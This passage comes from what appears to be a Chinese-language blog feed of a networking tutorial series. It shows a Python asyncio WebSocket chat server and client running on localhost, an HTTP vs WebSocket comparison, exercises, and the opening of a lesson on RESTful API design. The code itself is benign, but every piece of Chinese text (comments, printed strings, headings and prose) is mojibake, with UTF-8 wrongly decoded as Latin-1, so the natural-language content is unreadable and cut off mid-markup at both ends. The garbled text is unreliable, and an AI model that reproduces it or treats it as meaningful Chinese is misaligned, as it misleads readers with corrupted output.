å®¢æˆ·ç«¯ <span class="hljs-subst">&#123;client_id&#125;</span> è¿æ¥å…³é—­&quot;</span>)<br><br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-comment"># ç§»é™¤è¿æ¥</span><br>        connected_clients.remove(websocket)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å½“å‰åœ¨çº¿: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(connected_clients)&#125;</span> äºº&quot;</span>)<br><br>        <span class="hljs-comment"># å¹¿æ’­ç”¨æˆ·ç¦»å¼€æ¶ˆæ¯</span><br>        leave_msg = &#123;<br>            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;user_leave&quot;</span>,<br>            <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;ç”¨æˆ· <span class="hljs-subst">&#123;client_id&#125;</span> ç¦»å¼€äº†èŠå¤©å®¤&quot;</span>,<br>            <span class="hljs-string">&quot;online_count&quot;</span>: <span class="hljs-built_in">len</span>(connected_clients),<br>            <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>        &#125;<br>        <span class="hljs-keyword">await</span> broadcast(json.dumps(leave_msg, ensure_ascii=<span class="hljs-literal">False</span>))<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">broadcast</span>(<span class="hljs-params">message, exclude=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å¹¿æ’­æ¶ˆæ¯ç»™æ‰€æœ‰å®¢æˆ·ç«¯</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°ï¼š</span><br><span class="hljs-string">        message: è¦å¹¿æ’­çš„æ¶ˆæ¯</span><br><span class="hljs-string">        exclude: æ’é™¤çš„WebSocketè¿æ¥ï¼ˆå¯é€‰ï¼‰</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> connected_clients:<br>        <span class="hljs-comment"># è¿‡æ»¤æ‰excludeçš„è¿æ¥</span><br>        clients = connected_clients - &#123;exclude&#125; <span class="hljs-keyword">if</span> exclude <span class="hljs-keyword">else</span> connected_clients<br><br>        <span class="hljs-comment"># å¹¶å‘å‘é€ç»™æ‰€æœ‰å®¢æˆ·ç«¯</span><br>        <span class="hljs-keyword">await</span> asyncio.gather(<br>            *[client.send(message) <span class="hljs-keyword">for</span> client <span class="hljs-keyword">in</span> clients],<br>            return_exceptions=<span class="hljs-literal">True</span><br>        )<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;å¯åŠ¨WebSocketæœåŠ¡å™¨&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—</span><br><span class="hljs-string">    â•‘       WebSocket æœåŠ¡å™¨                                    â•‘</span><br><span class="hljs-string">    â•‘       WebSocket Server                                   â•‘</span><br><span class="hljs-string">    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</span><br><span class="hljs-string"></span><br><span class="hljs-string">    æœåŠ¡å™¨åœ°å€: ws://localhost:8765</span><br><span class="hljs-string">    ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥...</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br><br>    <span class="hljs-comment"># å¯åŠ¨æœåŠ¡å™¨</span><br>    server = <span class="hljs-keyword">await</span> websockets.serve(<br>        handle_client,<br>        <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-number">8765</span><br>    )<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WebSocketæœåŠ¡å™¨å·²å¯åŠ¨&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æŒ‰ Ctrl+C åœæ­¢æœåŠ¡å™¨\n&quot;</span>)<br><br>    <span class="hljs-comment"># ä¿æŒæœåŠ¡å™¨è¿è¡Œ</span><br>    <span class="hljs-keyword">await</span> asyncio.Future()  <span class="hljs-comment"># æ°¸ä¹…è¿è¡Œ</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">try</span>:<br>        asyncio.run(main())<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\næœåŠ¡å™¨å·²åœæ­¢&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="3-2-å®¢æˆ·ç«¯ä»£ç "><a href="#3-2-å®¢æˆ·ç«¯ä»£ç " class="headerlink" title="3.2 å®¢æˆ·ç«¯ä»£ç "></a>3.2 å®¢æˆ·ç«¯ä»£ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day31_websocket_client.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šWebSocketå®¢æˆ·ç«¯</span><br><br><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> websockets<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">client</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;WebSocketå®¢æˆ·ç«¯&quot;&quot;&quot;</span><br>    uri = <span class="hljs-string">&quot;ws://localhost:8765&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—</span><br><span class="hljs-string">    â•‘       WebSocket å®¢æˆ·ç«¯                                    â•‘</span><br><span class="hljs-string">    â•‘       WebSocket Client                                   â•‘</span><br><span class="hljs-string">    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>)<br><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> websockets.connect(uri) <span class="hljs-keyword">as</span> websocket:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å·²è¿æ¥åˆ°æœåŠ¡å™¨: <span class="hljs-subst">&#123;uri&#125;</span>\n&quot;</span>)<br><br>        <span class="hljs-comment"># å¯åŠ¨æ¥æ”¶æ¶ˆæ¯çš„ä»»åŠ¡</span><br>        receive_task = asyncio.create_task(receive_messages(websocket))<br><br>        <span class="hljs-comment"># å¯åŠ¨å¿ƒè·³ä»»åŠ¡</span><br>        heartbeat_task = asyncio.create_task(send_heartbeat(websocket))<br><br>        <span class="hljs-comment"># å‘é€æ¶ˆæ¯</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¾“å…¥æ¶ˆæ¯å¹¶æŒ‰Enterå‘é€ï¼ˆè¾“å…¥&#x27;quit&#x27;é€€å‡ºï¼‰ï¼š\n&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                message = <span class="hljs-keyword">await</span> asyncio.get_event_loop().run_in_executor(<br>                    <span class="hljs-literal">None</span>, <span class="hljs-built_in">input</span>, <span class="hljs-string">&quot;ä½ : &quot;</span><br>                )<br><br>                <span class="hljs-keyword">if</span> message.lower() == <span class="hljs-string">&#x27;quit&#x27;</span>:<br>                    <span class="hljs-keyword">break</span><br><br>                <span class="hljs-comment"># å‘é€èŠå¤©æ¶ˆæ¯</span><br>                chat_msg = &#123;<br>                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;chat&quot;</span>,<br>                    <span class="hljs-string">&quot;message&quot;</span>: message,<br>                    <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>                &#125;<br>                <span class="hljs-keyword">await</span> websocket.send(json.dumps(chat_msg, ensure_ascii=<span class="hljs-literal">False</span>))<br><br>        <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">finally</span>:<br>            receive_task.cancel()<br>            heartbeat_task.cancel()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nå·²æ–­å¼€è¿æ¥&quot;</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_messages</span>(<span class="hljs-params">websocket</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;æ¥æ”¶æœåŠ¡å™¨æ¶ˆæ¯&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">for</span> message <span class="hljs-keyword">in</span> websocket:<br>            data = json.loads(message)<br><br>            <span class="hljs-keyword">if</span> data[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;system&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[ç³»ç»Ÿ] <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;message&#x27;</span>]&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">elif</span> data[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;user_join&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[é€šçŸ¥] <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;message&#x27;</span>]&#125;</span> (åœ¨çº¿: <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;online_count&#x27;</span>]&#125;</span>)&quot;</span>)<br>            <span class="hljs-keyword">elif</span> data[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;user_leave&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[é€šçŸ¥] <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;message&#x27;</span>]&#125;</span> (åœ¨çº¿: <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;online_count&#x27;</span>]&#125;</span>)&quot;</span>)<br>            <span class="hljs-keyword">elif</span> data[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;chat&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[<span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;from&#x27;</span>]&#125;</span>]: <span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;message&#x27;</span>]&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">elif</span> data[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;pong&#x27;</span>:<br>                <span class="hljs-comment"># å¿ƒè·³å“åº”ï¼Œä¸æ˜¾ç¤º</span><br>                <span class="hljs-keyword">pass</span><br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ä½ : &quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">except</span> asyncio.CancelledError:<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_heartbeat</span>(<span class="hljs-params">websocket</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;å‘é€å¿ƒè·³&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">30</span>)  <span class="hljs-comment"># æ¯30ç§’</span><br>            ping_msg = &#123;<br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;ping&quot;</span>,<br>                <span class="hljs-string">&quot;timestamp&quot;</span>: datetime.now().isoformat()<br>            &#125;<br>            <span class="hljs-keyword">await</span> websocket.send(json.dumps(ping_msg))<br>    <span class="hljs-keyword">except</span> asyncio.CancelledError:<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    asyncio.run(client())<br></code></pre></td></tr></table></figure><hr><h2 id="4-WebSocket-vs-HTTPå¯¹æ¯”"><a href="#4-WebSocket-vs-HTTPå¯¹æ¯”" class="headerlink" title="4. WebSocket vs HTTPå¯¹æ¯”"></a>4. WebSocket vs HTTPå¯¹æ¯”</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs">å¯¹æ¯”æ€»ç»“ï¼š<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ç‰¹æ€§       â”‚ HTTP              â”‚ WebSocket         â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ é€šä¿¡æ–¹å‘   â”‚ å•å‘ï¼ˆè¯·æ±‚-å“åº”ï¼‰ â”‚ åŒå‘ï¼ˆå…¨åŒå·¥ï¼‰    â”‚<br>â”‚ è¿æ¥       â”‚ çŸ­è¿æ¥            â”‚ é•¿è¿æ¥            â”‚<br>â”‚ å¼€é”€       â”‚ æ¯æ¬¡è¯·æ±‚éƒ½æœ‰å¤´éƒ¨  â”‚ æ¡æ‰‹åå¼€é”€å°      â”‚<br>â”‚ å®æ—¶æ€§     â”‚ å·®ï¼ˆéœ€è½®è¯¢ï¼‰      â”‚ å¥½ï¼ˆæ¨é€ï¼‰        â”‚<br>â”‚ æœåŠ¡å™¨æ¨é€ â”‚ ä¸æ”¯æŒ            â”‚ æ”¯æŒ              â”‚<br>â”‚ é€‚ç”¨åœºæ™¯   â”‚ ä¼ ç»ŸWebåº”ç”¨       â”‚ å®æ—¶åº”ç”¨          â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>é€‚ç”¨åœºæ™¯ï¼š<br><br>WebSocketé€‚åˆï¼š<br>âœ… å®æ—¶èŠå¤©<br>âœ… åœ¨çº¿æ¸¸æˆ<br>âœ… å®æ—¶åä½œï¼ˆæ–‡æ¡£ç¼–è¾‘ï¼‰<br>âœ… å®æ—¶æ•°æ®å±•ç¤ºï¼ˆè‚¡ç¥¨ã€ç›‘æ§ï¼‰<br>âœ… æ¨é€é€šçŸ¥<br><br>HTTPé€‚åˆï¼š<br>âœ… ä¼ ç»Ÿç½‘é¡µæµè§ˆ<br>âœ… RESTful API<br>âœ… æ–‡ä»¶ä¸Šä¼ /ä¸‹è½½<br>âœ… ä¸éœ€è¦å®æ—¶æ€§çš„åº”ç”¨<br></code></pre></td></tr></table></figure><hr><h2 id="5-ä»Šæ—¥ç»ƒä¹ "><a href="#5-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="5. ä»Šæ—¥ç»ƒä¹ "></a>5. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šå®ç°ç®€å•èŠå¤©å®¤"><a href="#ç»ƒä¹ 1ï¼šå®ç°ç®€å•èŠå¤©å®¤" class="headerlink" title="ç»ƒä¹ 1ï¼šå®ç°ç®€å•èŠå¤©å®¤"></a>ç»ƒä¹ 1ï¼šå®ç°ç®€å•èŠå¤©å®¤</h3><p>è¿è¡ŒWebSocketæœåŠ¡å™¨å’Œå¤šä¸ªå®¢æˆ·ç«¯ï¼Œæµ‹è¯•ï¼š</p><ol><li>æ¶ˆæ¯å¹¿æ’­</li><li>ç”¨æˆ·åŠ å…¥&#x2F;ç¦»å¼€é€šçŸ¥</li><li>åœ¨çº¿äººæ•°ç»Ÿè®¡</li></ol><h3 id="ç»ƒä¹ 2ï¼šæ·»åŠ åŠŸèƒ½"><a href="#ç»ƒä¹ 2ï¼šæ·»åŠ åŠŸèƒ½" class="headerlink" title="ç»ƒä¹ 2ï¼šæ·»åŠ åŠŸèƒ½"></a>ç»ƒä¹ 2ï¼šæ·»åŠ åŠŸèƒ½</h3><p>æ‰©å±•èŠå¤©å®¤åŠŸèƒ½ï¼š</p><ol><li>ç”¨æˆ·å‘½å</li><li>ç§èŠåŠŸèƒ½</li><li>æ¶ˆæ¯å†å²è®°å½•</li><li>æ–­çº¿é‡è¿</li></ol><hr><p><strong>è¿›åº¦ï¼š31&#x2F;120å¤©ï¼ˆ25.8%ï¼‰</strong></p><p>æ˜å¤©æˆ‘ä»¬å°†è¿›è¡Œå®æˆ˜é¡¹ç›®ï¼šæ„å»ºå®Œæ•´çš„Web APIæœåŠ¡ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>30å¤©ï¼šRESTful APIè®¾è®¡</title>
    <link href="/2025/11/10/30%E5%A4%A9%EF%BC%9ARESTful%20API%E8%AE%BE%E8%AE%A1/"/>
    <url>/2025/11/10/30%E5%A4%A9%EF%BC%9ARESTful%20API%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬30å¤©ï¼šRESTful-APIè®¾è®¡"><a href="#ç¬¬30å¤©ï¼šRESTful-APIè®¾è®¡" class="headerlink" title="ç¬¬30å¤©ï¼šRESTful APIè®¾è®¡"></a>ç¬¬30å¤©ï¼šRESTful APIè®¾è®¡</h1><blockquote><p>â€œå¥½çš„APIè®¾è®¡å°±åƒå¥½çš„ç”¨æˆ·ç•Œé¢ï¼Œè®©ä½¿ç”¨è€…æ„Ÿåˆ°ç›´è§‚å’Œæ„‰æ‚¦ï¼â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡"><a href="#ğŸ“š-ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ğŸ“š ä»Šæ—¥ç›®æ ‡"></a>ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£RESTæ¶æ„é£æ ¼</li><li>æŒæ¡RESTful APIè®¾è®¡åŸåˆ™</li><li>å­¦ä¹ HTTPæ–¹æ³•çš„æ­£ç¡®ä½¿ç”¨</li><li>ç†è§£èµ„æºå’ŒURIè®¾è®¡</li><li>æŒæ¡APIç‰ˆæœ¬æ§åˆ¶å’Œé”™è¯¯å¤„ç†</li><li>å®ç°ä¸€ä¸ªç®€å•çš„RESTful API</li></ul><hr><h2 id="1-RESTåŸºç¡€æ¦‚å¿µ"><a href="#1-RESTåŸºç¡€æ¦‚å¿µ" class="headerlink" title="1. RESTåŸºç¡€æ¦‚å¿µ"></a>1. RESTåŸºç¡€æ¦‚å¿µ</h2><h3 id="1-1-ä»€ä¹ˆæ˜¯RESTï¼Ÿ"><a href="#1-1-ä»€ä¹ˆæ˜¯RESTï¼Ÿ" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯RESTï¼Ÿ"></a>1.1 ä»€ä¹ˆæ˜¯RESTï¼Ÿ</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">REST (Representational State Transfer)<br>è¡¨è¿°æ€§çŠ¶æ€è½¬ç§»<br><br>æ ¸å¿ƒæ€æƒ³ï¼š<br><span class="hljs-bullet">- </span>èµ„æºï¼ˆResourceï¼‰ä¸ºä¸­å¿ƒ<br><span class="hljs-bullet">- </span>ä½¿ç”¨æ ‡å‡†HTTPæ–¹æ³•<br><span class="hljs-bullet">- </span>æ— çŠ¶æ€é€šä¿¡<br><span class="hljs-bullet">- </span>ç»Ÿä¸€æ¥å£<br><br>RESTä¸æ˜¯åè®®ï¼Œè€Œæ˜¯ä¸€ç§æ¶æ„é£æ ¼<br><br>ç±»æ¯”ï¼š<br>REST API = å›¾ä¹¦é¦†ç®¡ç†ç³»ç»Ÿ<br><span class="hljs-bullet">- </span>èµ„æº = ä¹¦ç±<br><span class="hljs-bullet">- </span>URI = ä¹¦ç±ç¼–å·<br><span class="hljs-bullet">- </span>HTTPæ–¹æ³• = æ“ä½œï¼ˆå€Ÿã€è¿˜ã€æŸ¥ã€åˆ ï¼‰<br><span class="hljs-bullet">- </span>çŠ¶æ€ç  = æ“ä½œç»“æœï¼ˆæˆåŠŸã€å¤±è´¥ã€æœªæ‰¾åˆ°ï¼‰<br><br>ä¾‹å¦‚ï¼š<br>GET /books/123        â†’ æŸ¥è¯¢123å·ä¹¦<br>POST /books           â†’ æ–°å¢ä¸€æœ¬ä¹¦<br>PUT /books/123        â†’ æ›´æ–°123å·ä¹¦<br>DELETE /books/123     â†’ åˆ é™¤123å·ä¹¦<br></code></pre></td></tr></table></figure><h3 id="1-2-RESTçš„å…­å¤§çº¦æŸ"><a href="#1-2-RESTçš„å…­å¤§çº¦æŸ" class="headerlink" title="1.2 RESTçš„å…­å¤§çº¦æŸ"></a>1.2 RESTçš„å…­å¤§çº¦æŸ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> å®¢æˆ·ç«¯-æœåŠ¡å™¨åˆ†ç¦» (Client-Server)<br><span class="hljs-bullet">   -</span> å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç‹¬ç«‹æ¼”åŒ–<br><span class="hljs-bullet">   -</span> å‰åç«¯åˆ†ç¦»<br><br><span class="hljs-bullet">2.</span> æ— çŠ¶æ€ (Stateless)<br><span class="hljs-bullet">   -</span> æ¯ä¸ªè¯·æ±‚åŒ…å«æ‰€æœ‰å¿…è¦ä¿¡æ¯<br><span class="hljs-bullet">   -</span> æœåŠ¡å™¨ä¸ä¿å­˜å®¢æˆ·ç«¯çŠ¶æ€<br><span class="hljs-bullet">   -</span> æ˜“äºæ‰©å±•å’Œè´Ÿè½½å‡è¡¡<br><br><span class="hljs-bullet">3.</span> å¯ç¼“å­˜ (Cacheable)<br><span class="hljs-bullet">   -</span> å“åº”å¯ä»¥è¢«ç¼“å­˜<br><span class="hljs-bullet">   -</span> æé«˜æ€§èƒ½<br><br><span class="hljs-bullet">4.</span> åˆ†å±‚ç³»ç»Ÿ (Layered System)<br><span class="hljs-bullet">   -</span> å®¢æˆ·ç«¯ä¸çŸ¥é“ç›´æ¥è¿æ¥çš„æ˜¯æœåŠ¡å™¨è¿˜æ˜¯ä¸­é—´å±‚<br><span class="hljs-bullet">   -</span> å¯ä»¥åŠ å…¥è´Ÿè½½å‡è¡¡ã€ç¼“å­˜ç­‰<br><br><span class="hljs-bullet">5.</span> ç»Ÿä¸€æ¥å£ (Uniform Interface)<br><span class="hljs-bullet">   -</span> èµ„æºæ ‡è¯†ï¼ˆURIï¼‰<br><span class="hljs-bullet">   -</span> é€šè¿‡è¡¨è¿°æ“ä½œèµ„æº<br><span class="hljs-bullet">   -</span> è‡ªæè¿°æ¶ˆæ¯<br><span class="hljs-bullet">   -</span> è¶…åª’ä½“é©±åŠ¨ï¼ˆHATEOASï¼‰<br><br><span class="hljs-bullet">6.</span> æŒ‰éœ€ä»£ç ï¼ˆå¯é€‰ï¼‰(Code on Demand)<br><span class="hljs-bullet">   -</span> æœåŠ¡å™¨å¯ä»¥è¿”å›å¯æ‰§è¡Œä»£ç <br><span class="hljs-bullet">   -</span> å¦‚JavaScript<br></code></pre></td></tr></table></figure><hr><h2 id="2-RESTful-APIè®¾è®¡åŸåˆ™"><a href="#2-RESTful-APIè®¾è®¡åŸåˆ™" class="headerlink" title="2. RESTful APIè®¾è®¡åŸåˆ™"></a>2. RESTful APIè®¾è®¡åŸåˆ™</h2><h3 id="2-1-èµ„æºå’ŒURIè®¾è®¡"><a href="#2-1-èµ„æºå’ŒURIè®¾è®¡" class="headerlink" title="2.1 èµ„æºå’ŒURIè®¾è®¡"></a>2.1 èµ„æºå’ŒURIè®¾è®¡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 